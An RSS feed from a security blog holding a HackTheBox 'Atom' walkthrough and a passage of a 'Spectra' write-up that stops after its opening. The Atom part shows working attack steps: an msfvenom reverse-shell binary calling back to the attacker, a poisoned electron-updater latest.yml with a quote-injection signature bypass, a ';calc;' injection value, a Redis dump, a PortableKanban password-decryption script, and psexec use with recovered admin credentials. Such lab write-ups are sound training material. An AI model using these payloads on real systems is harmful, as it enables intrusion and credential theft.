<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Command-injection on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/command-injection/</link>
    <description>Recent content in Command-injection on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 10 Jul 2021 20:28:32 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/command-injection/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis.</description>
      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ nmap -p- --max-rate <span style="color:#ae81ff">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-17 07:56 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.237
Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65529</span> filtered ports
Reason: <span style="color:#ae81ff">65529</span> no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
135/tcp  open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
445/tcp  open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
5985/tcp open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
6379/tcp open  redis        syn-ack ttl <span style="color:#ae81ff">127</span> Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 153.92 seconds
</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
$ nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
INFO
-NOAUTH Authentication required.
</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ crackmapexec smb 10.10.10.237 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> x64 <span style="color:#f92672">(</span>name:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ATOM<span style="color:#ae81ff">\A</span>NONYMOUS: 
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             -----           -----------     ------
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             C$                              Default share
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Software_Updates READ,WRITE      
</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client1                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client2                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client3                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  UAT_Testing_Procedures.pdf          A    <span style="color:#ae81ff">35202</span>  Fri Apr  <span style="color:#ae81ff">9</span> 07:18:08 <span style="color:#ae81ff">2021</span>

                <span style="color:#ae81ff">4413951</span> blocks of size 4096. <span style="color:#ae81ff">1361569</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> prompt off
smb: <span style="color:#ae81ff">\&gt;</span> mget *
getting file <span style="color:#ae81ff">\U</span>AT_Testing_Procedures.pdf of size <span style="color:#ae81ff">35202</span> as UAT_Testing_Procedures.pdf <span style="color:#f92672">(</span>121.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 121.5 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are displaying a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<pre><code>→ root@kali «atom» «10.10.14.49» 
$ echo '10.10.10.237 atom.htb' &gt;&gt; /etc/hosts
</code></pre><p>After the hostname added, the site still shows the same content.</p>
<pre><code>→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://10.10.10.237/ | wc -c
7581
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://10.10.10.237/ | wc -c 
7581
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://atom.htb/ | wc -c
7581
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://atom.htb/ | wc -c
7581
</code></pre><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<pre><code>→ root@kali «loot» «10.10.14.49» 
$ file heedv1_setup_1.0.0.exe 
heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
</code></pre><p>&ldquo;self-extracting archive&rdquo; is written in the file info above, it means it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
$ tree
.
├── $PLUGINSDIR
│   ├── app-64
...&lt;SNIP&gt;...
│   │   ├── natives_blob.bin
│   │   ├── resources
│   │   │   ├── app.asar
│   │   │   ├── app-update.yml # ==&gt; Updater config
│   │   │   ├── electron.asar
│   │   │   ├── elevate.exe
│   │   │   └── inspector
...&lt;SNIP&gt;...

73 directories, 274 files
</code></pre><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ cat ./<span style="color:#ae81ff">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
provider: generic
url: <span style="color:#e6db74">&#39;http://updates.atom.htb&#39;</span>
publisherName:
  - HackTheBox
</code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ curl -s http://updates.atom.htb/ | wc -c
<span style="color:#ae81ff">7581</span>
</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
...&lt;SNIP&gt;...
</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious <code>latest.yml</code> (contains the app update definition) will pop a calculator.</p>
<pre><code>version: 2.0.0
path: u';calc;'pdate.exe
sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>And if a single quote <code>'</code> is added to <code>path</code>, it breaks the verification, which is simplified as follows:</p>
<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
</code></pre><p>But, by recalculating the hash of <code>u'pdate.exe</code>, an attacker could bypass the signature verification and  <code>u'pdate.exe</code>  would be executed as well.</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote, but I&rsquo;ll go with remote.</p>
<p>First, I&rsquo;ll generate a reverse shell binary using <code>msfvenom</code>, and I&rsquo;ll this binary with Python web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.49 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span> -f exe -o i<span style="color:#ae81ff">\&#39;</span>amf.exe
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span style="color:#ae81ff">460</span> bytes
Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
Saved as: i<span style="color:#960050;background-color:#1e0010">&#39;</span>amf.exe
</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ shasum -a <span style="color:#ae81ff">512</span> i<span style="color:#ae81ff">\&#39;</span>amf.exe | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | xxd -r -p | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>
Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span style="color:#f92672">==</span>
</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<pre><code>version: 2.0.1
path: http://10.10.14.83/i'amf.exe
sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
listening on [any] 53 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami
whoami
atom\jason

C:\WINDOWS\system32&gt;
</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
</p>
<p>User flag is done here.</p>
<pre><code>C:\Users\jason\Desktop&gt;type user.txt
type user.txt
b77e754354e186f...&lt;SNIP&gt;...
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
[+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. The <code>portablekanban.cfg</code> contains Redis DSN, which includes Redis Database password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
type PortableKanban\PortableKanban.cfg
{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
type redis.windows.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
type redis.windows-service.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ rlwrap nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>redis<span style="color:#f92672">)</span> open
AUTH jason kidvscat_electron_@123
-ERR wrong number of arguments <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;auth&#39;</span> command
AUTH kidvscat_electron_@123
-ERR invalid password
AUTH kidvscat_yes_kidvscat
+OK
</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INFO
$1938
# Server
redis_version:3.0.504
...&lt;SNIP&gt;...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">SELECT 0
+OK
KEYS *
*4
$48
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$11
pk:ids:User
$20
pk:ids:MetaDataClass
$57
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">GET</span> <span style="color:#960050;background-color:#1e0010">pk:urn:user:e</span><span style="color:#ae81ff">8e29158</span><span style="color:#960050;background-color:#1e0010">-d</span><span style="color:#ae81ff">70</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">-44</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">-a</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">ba</span><span style="color:#ae81ff">-4949</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">52790</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">207</span>
{<span style="color:#f92672">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,<span style="color:#f92672">&#34;Name&#34;</span>:<span style="color:#e6db74">&#34;Administrator&#34;</span>,<span style="color:#f92672">&#34;Initials&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;Email&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;EncryptedPassword&#34;</span>:<span style="color:#e6db74">&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;</span>,<span style="color:#f92672">&#34;Role&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,<span style="color:#f92672">&#34;Inactive&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;TimeStamp&#34;</span>:<span style="color:#ae81ff">637530169606440253</span>}
</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">from base64 import b64decode
import sys
import des 

key <span style="color:#f92672">=</span> des.DesKey<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;7ly6UznJ&#39;</span><span style="color:#f92672">)</span>
iv <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;XuVUm5fR&#39;</span>

try:    
	passwd <span style="color:#f92672">=</span> b64decode<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.encode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
except IndexError:
	print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>
    
	sys.exit<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>

dec_password <span style="color:#f92672">=</span> key.decrypt<span style="color:#f92672">(</span>passwd, initial<span style="color:#f92672">=</span>iv, padding<span style="color:#f92672">=</span>True<span style="color:#f92672">)</span>
print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «atom» «10.10.14.83»
$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted Password: kidvscat_admin_@123
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.237.....
[*] Found writable share ADMIN$
[*] Uploading file FCSITnEj.exe
[*] Opening SVCManager on 10.10.10.237.....
[*] Creating service DCLl on 10.10.10.237.....
[*] Starting service DCLl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
nt authority\system
ATOM

C:\WINDOWS\system32&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&amp;rsquo;m able to inject a PHP code into a theme file to get a foothold on the system.</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Internal enumeration finds an auto-login password and the password is reused by the user. The user has sudo privileges on <code>initctl</code>, which can be leveraged to get a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting WordPress</li>
<li>Command injection</li>
<li>Exploiting sudo privileges on initctl</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
